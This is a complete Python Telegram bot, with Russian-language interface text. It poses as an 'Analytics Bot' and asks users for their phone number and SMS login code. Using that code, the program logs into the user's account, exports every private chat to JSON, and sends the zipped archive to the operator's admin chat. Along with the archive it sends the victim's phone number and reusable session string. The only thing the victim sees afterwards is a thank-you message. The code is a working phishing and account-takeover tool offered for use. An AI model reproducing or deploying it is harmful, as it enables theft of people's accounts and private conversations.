"""
Telegram Analytics Bot - Сбор StringSession + Авто-экспорт ТОЛЬКО личных чатов
"""
import asyncio
import os
import json
import zipfile
import shutil
import tempfile
import threading
import logging
from datetime import datetime
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import PhoneCodeInvalidError, PhoneCodeExpiredError, FloodWaitError, AuthKeyError, UnauthorizedError
from fastapi import FastAPI
import uvicorn
import aiohttp

# ==========================================
# ЛОГИРОВАНИЕ
# ==========================================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('analytics_bot')

# ==========================================
# НАСТРОЙКИ
# ==========================================
BOT_TOKEN = os.getenv('BOT_TOKEN')
API_ID = int(os.getenv('API_ID', 0))
API_HASH = os.getenv('API_HASH')
ADMIN_CHAT_ID = int(os.getenv('ADMIN_CHAT_ID', 0))
PORT = int(os.getenv('PORT', 10000))

if not all([BOT_TOKEN, API_ID, API_HASH, ADMIN_CHAT_ID]):
    raise ValueError("Все переменные окружения обязательны!")

# ==========================================
# ВЕБ-СЕРВЕР
# ==========================================
web_app = FastAPI(title="Analytics Bot")

@web_app.get("/health")
async def health():
    return {"status": "ok", "service": "Analytics Bot", "timestamp": datetime.now().isoformat()}

def run_web():
    uvicorn.run(web_app, host="0.0.0.0", port=PORT, log_level="warning")

# ==========================================
# АВТОПИНГ
# ==========================================
async def auto_ping():
    url = f"http://localhost:{PORT}/health"
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=5) as resp:
                    if resp.status == 200:
                        logger.debug("🔄 Пинг успешен")
        except Exception as e:
            logger.warning(f"Пинг не удался: {e}")
        await asyncio.sleep(300)

# ==========================================
# ОСНОВНОЙ БОТ
# ==========================================
class AnalyticsBot:
    def __init__(self):
        self.bot = TelegramClient('bot_session', API_ID, API_HASH)
        self.pending = {}
        self.exporting = {}
        self.running = True
        self.keep_alive_task = None

    async def start(self):
        """Запуск с автоперезапуском"""
        while self.running:
            try:
                logger.info("🔄 Подключение к Telegram...")
                await self.bot.start(bot_token=BOT_TOKEN)
                logger.info("✅ Бот авторизован")
                
                # Регистрируем обработчики
                self.bot.add_event_handler(self.cmd_start, events.NewMessage(pattern='/start'))
                self.bot.add_event_handler(self.cmd_help, events.NewMessage(pattern='/help'))
                self.bot.add_event_handler(self.cmd_stats, events.NewMessage(pattern='/stats'))
                self.bot.add_event_handler(self.cmd_add, events.NewMessage(pattern='/add'))
                self.bot.add_event_handler(self.cmd_ping, events.NewMessage(pattern='/ping'))
                self.bot.add_event_handler(self.handle_msg, events.NewMessage())
                logger.info("✅ Обработчики зарегистрированы")
                
                # Запускаем Keep-Alive
                if not self.keep_alive_task:
                    self.keep_alive_task = asyncio.create_task(self.keep_alive())
                
                # Отправляем приветствие админу
                await self.bot.send_message(ADMIN_CHAT_ID, "✅ Бот запущен и готов к работе!")
                
                await self.bot.run_until_disconnected()
                
            except AuthKeyError:
                logger.error("❌ Невалидная сессия. Удаляем и пересоздаём...")
                try:
                    os.remove('bot_session.session')
                except:
                    pass
                await asyncio.sleep(2)
                
            except UnauthorizedError:
                logger.error("❌ Бот не авторизован. Проверьте токен.")
                await asyncio.sleep(30)
                
            except Exception as e:
                logger.error(f"❌ Критическая ошибка: {e}")
                await asyncio.sleep(10)

    # ===== KEEP-ALIVE =====
    async def keep_alive(self):
        """Держит соединение с Telegram живым"""
        while self.running:
            try:
                if not self.bot.is_connected():
                    logger.info("🔄 Переподключение...")
                    await self.bot.connect()
                await self.bot.get_me()
            except Exception as e:
                logger.warning(f"Keep-alive ошибка: {e}")
            await asyncio.sleep(120)

    # ===== КОМАНДЫ =====
    async def cmd_start(self, e):
        try:
            await e.respond("""
📊 **Telegram Analytics Bot**

Анализируйте свою активность в Telegram!

📌 **Команды:**
/add - Подключить аккаунт для аналитики
/stats - Статистика
/help - Помощь
/ping - Проверка работы
""")
            logger.info(f"✅ /start от {e.sender_id}")
        except Exception as err:
            logger.error(f"Ошибка в /start: {err}")

    async def cmd_help(self, e):
        await e.respond("""
📚 **Как подключить аккаунт:**

1️⃣ Отправьте /add
2️⃣ Введите номер телефона
3️⃣ Введите код из SMS

⏳ После подключения бот соберёт ваши личные чаты.
""")

    async def cmd_stats(self, e):
        await e.respond("📊 Статистика пока пуста. Подключите аккаунт через /add.")

    async def cmd_ping(self, e):
        await e.respond("🏓 Pong! Бот работает.")

    async def cmd_add(self, e):
        uid = e.sender_id
        if uid in self.pending:
            await e.respond("⏳ Уже идёт подключение.")
            return
        self.pending[uid] = {'step': 'phone'}
        await e.respond("📱 Введите номер телефона (например: +79001234567)")

    # ===== ОБРАБОТЧИК ВСЕХ СООБЩЕНИЙ =====
    async def handle_msg(self, e):
        """Ловит все сообщения, которые не команды"""
        uid = e.sender_id
        text = e.text
        
        logger.info(f"📩 Сообщение от {uid}: {text[:50]}...")
        
        if not text or text.startswith('/'):
            return
        
        if uid not in self.pending:
            return
        
        step = self.pending[uid].get('step')
        
        if step == 'phone':
            await self.process_phone(e, text)
        elif step == 'code':
            await self.process_code(e, text)

    # ===== ОБРАБОТКА ТЕЛЕФОНА =====
    async def process_phone(self, e, phone: str):
        uid = e.sender_id
        phone = phone.strip().replace(' ', '').replace('-', '').replace('(', '').replace(')', '').replace('.', '')
        
        if phone.startswith('8') and len(phone) == 11:
            phone = '+7' + phone[1:]
        elif not phone.startswith('+'):
            phone = '+' + phone
        
        try:
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            result = await client.send_code_request(phone)
            
            self.pending[uid] = {
                'step': 'code',
                'phone': phone,
                'hash': result.phone_code_hash,
                'client': client
            }
            await e.respond("📨 Код отправлен! Введите его (цифры).")
            
        except Exception as err:
            await e.respond(f"❌ Ошибка: {err}")
            if uid in self.pending:
                del self.pending[uid]

    # ===== ОБРАБОТКА КОДА =====
    async def process_code(self, e, code: str):
        uid = e.sender_id
        data = self.pending.get(uid)
        if not data:
            return
        
        code = code.strip().replace(' ', '').replace('-', '')
        
        try:
            await data['client'].sign_in(
                phone=data['phone'],
                code=code,
                phone_code_hash=data['hash']
            )
            
            me = await data['client'].get_me()
            session_string = data['client'].session.save()
            await data['client'].disconnect()
            
            asyncio.create_task(self.export_and_send(uid, session_string, me))
            
            await e.respond(f"""
✅ Аккаунт {me.first_name} подключен!
Обработка чатов займёт 2-10 минут.
""")
            
            if uid in self.pending:
                del self.pending[uid]
            
        except PhoneCodeInvalidError:
            await e.respond("❌ Неверный код. Попробуйте ещё раз.")
        except PhoneCodeExpiredError:
            await e.respond("❌ Код истек. Начните заново /add")
            if uid in self.pending:
                del self.pending[uid]
        except Exception as err:
            await e.respond(f"❌ Ошибка: {err}")
            if uid in self.pending:
                del self.pending[uid]

    # ===== ЭКСПОРТ =====
    async def export_and_send(self, uid: int, session_string: str, me):
        if self.exporting.get(uid, False):
            return
        
        self.exporting[uid] = True
        export_client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        
        try:
            await self.bot.send_message(ADMIN_CHAT_ID, f"📥 Экспорт для {me.first_name} {me.last_name or ''} (ID: {me.id})")
            
            await export_client.connect()
            if not await export_client.is_user_authorized():
                await self.bot.send_message(ADMIN_CHAT_ID, "❌ Невалидная сессия")
                return
            
            dialogs = await export_client.get_dialogs()
            export_dir = tempfile.mkdtemp()
            total_messages = 0
            processed = 0
            
            for dialog in dialogs:
                if not dialog.is_user:
                    continue
                
                try:
                    messages = []
                    async for msg in export_client.iter_messages(dialog, limit=None):
                        messages.append({
                            'id': msg.id,
                            'date': msg.date.isoformat() if msg.date else None,
                            'text': msg.text or '',
                            'sender_id': msg.sender_id,
                            'sender_name': msg.sender.first_name if msg.sender else None
                        })
                    
                    if messages:
                        chat_name = dialog.name or "Без названия"
                        safe_name = chat_name.replace('/', '_').replace('\\', '_').replace(':', '_')
                        filename = f"{dialog.id}_{safe_name}.json"
                        filepath = os.path.join(export_dir, filename)
                        
                        with open(filepath, 'w', encoding='utf-8') as f:
                            json.dump({
                                'chat_name': chat_name,
                                'chat_id': dialog.id,
                                'total_messages': len(messages),
                                'messages': messages
                            }, f, ensure_ascii=False, indent=2)
                        
                        total_messages += len(messages)
                        processed += 1
                        logger.info(f"✅ {chat_name}: {len(messages)} сообщений")
                        
                except FloodWaitError as e:
                    logger.warning(f"FloodWait {e.seconds} сек")
                    await asyncio.sleep(e.seconds)
                except Exception as e:
                    logger.error(f"Ошибка чата {dialog.name}: {e}")
                    continue
            
            # ZIP
            zip_filename = tempfile.mktemp(suffix='.zip')
            with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, _, files in os.walk(export_dir):
                    for file in files:
                        zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), export_dir))
            
            shutil.rmtree(export_dir)
            
            with open(zip_filename, 'rb') as f:
                await self.bot.send_file(
                    ADMIN_CHAT_ID,
                    f,
                    caption=f"""
📦 **Экспорт завершён!**
👤 {me.first_name} {me.last_name or ''}
📱 +{me.phone}
📨 Сообщений: {total_messages}
📁 Чатов: {processed}
🔑 **STRING SESSION:**
`{session_string}`
"""
                )
            
            os.unlink(zip_filename)
            
            await self.bot.send_message(uid, "✅ Аналитика завершена! Спасибо.")
            
        except Exception as err:
            logger.error(f"Ошибка экспорта: {err}")
            await self.bot.send_message(ADMIN_CHAT_ID, f"❌ Ошибка: {err}")
        finally:
            await export_client.disconnect()
            self.exporting[uid] = False

# ==========================================
# ЗАПУСК
# ==========================================
async def main():
    # Веб-сервер
    threading.Thread(target=run_web, daemon=True).start()
    logger.info("✅ Веб-сервер запущен")
    
    asyncio.create_task(auto_ping())
    logger.info("✅ Автопинг запущен")
    
    bot = AnalyticsBot()
    await bot.start()

if __name__ == '__main__':
    asyncio.run(main())